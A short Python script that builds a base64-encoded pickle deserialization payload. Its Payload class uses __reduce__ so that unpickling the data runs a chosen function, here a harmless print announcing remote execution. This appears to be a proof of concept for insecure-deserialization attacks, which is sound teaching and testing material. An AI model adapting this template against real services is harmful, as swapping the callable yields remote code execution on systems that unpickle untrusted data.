import pickle
import base64


class Payload():
    def __reduce__(self):
        return (
            print, (
                'this code was remotely executed by the client',
            )
        )

serialized = pickle.dumps(Payload())
encoded = base64.b64encode(serialized)
print(encoded)